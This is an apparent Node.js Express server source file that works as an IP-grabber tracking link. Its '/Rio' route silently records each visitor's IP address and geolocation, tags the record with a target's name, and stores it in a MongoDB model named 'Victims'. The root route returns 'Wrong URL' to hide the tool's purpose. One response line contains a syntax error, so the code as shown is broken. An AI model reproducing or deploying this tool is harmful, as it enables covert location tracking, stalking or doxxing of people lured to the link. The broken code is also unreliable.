require('dotenv').config();

const express = require("express");
const chalk = require('chalk');
const expressip = require('express-ip');
const ejs = require('ejs');
const mongoose = require('mongoose');
const Victims = require('./model');

const app = express();

app.set("trust proxy", true);
app.use((req, res, next) => {
  if (!req.secure) return res.redirect("https://" + req.get("host") + req.url);
  next();
});

mongoose.connect(process.env.DATABASE_URI, {
    useUnifiedTopology: true,
    useNewUrlParser: true
});

const db = mongoose.connection;

db.on('connected', () => {
    console.log(chalk.yellow('database connected'));
});

db.on('disconnected', () => {
    console.log(chalk.redBright('database disconnected'));
});

db.on('error', () => {
    console.error(chalk.red('connection error'));
});

db.on('open', () => {
    console.log(chalk.green('database open'));
});

const PORT = process.env.PORT || 3000;

app.use(express.static("public"));
app.use(express.urlencoded({ extended: false }));
app.use(expressip().getIpInfoMiddleware);
app.use(express.json());

app.get('/', (req, res) => {
    res.send('Wrong URL');
});

app.get("/Rio", (req, res) => {
    let info = req.ipInfo;
    info.name = "Rio";
    res.send("Information": + req.ipInfo);
    let myData = new Victims(req.ipInfo);

    myData.save()
        .then(item => {
            console.log(chalk.green('username saved in the database'));
        })
        .catch(err => {
            console.log(chalk.red('problem while saving username in the databse'));
        });
});

app.listen(PORT, () => {
  console.log(chalk.bgYellow(`Server listening on port ${PORT}...`));
});
